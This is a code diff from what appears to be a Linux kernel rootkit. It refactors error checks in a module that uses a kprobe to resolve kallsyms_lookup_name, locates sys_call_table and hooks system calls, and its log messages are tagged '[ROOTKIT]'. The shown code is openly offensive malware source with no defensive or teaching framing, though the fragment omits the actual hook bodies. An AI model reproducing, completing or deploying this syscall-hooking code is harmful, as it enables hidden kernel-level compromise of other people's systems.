@@ -1,5 +1,6 @@
 #include "hooking.h"
 
+#include "macro-utils.h"
 #include <asm-generic/errno-base.h>
 #include <asm/processor-flags.h>
 #include <asm/special_insns.h>
@@ -53,13 +54,13 @@ int init_hooking(void)
         .symbol_name = KALLSYMS_NAME,
     };
 
-    if (lookup_name != NULL) {
+    IF_U (lookup_name != NULL) {
         pr_err("[ROOTKIT] Hooking module already initialized.\n");
         return -EALREADY;
     }
 
     i_err = register_kprobe(&probe);
-    if (i_err) {
+    IF_U (i_err) {
         pr_err("[ROOTKIT] Failed to get kallsyms_lookup_name() address.\n");
         return i_err;
     }
@@ -73,7 +74,7 @@ int init_hooking(void)
 
     // Find syscall table address
     p_syscall_table = lookup_name(SYS_CALL_TABLE_NAME);
-    if (p_syscall_table == NULL) {
+    IF_U (p_syscall_table == NULL) {
         pr_err("[ROOTKIT] Failed to get sys_call_table address.\n");
         return -ENOENT;
     }
@@ -121,7 +122,7 @@ int hook_syscalls(hook_t p_hooks[], size_t sz_count)
 
     for (i = 0; i < sz_count; ++i) {
         i_err = hook_syscall(&p_hooks[i]);
-        if (i_err) {
+        IF_U (i_err) {
             pr_err("[ROOTKIT] Failed to hook syscall %zu (n. %zu)\n", p_hooks[i].sz_syscall_nr, i);
 
             // Rollback previous hooks before returning the error
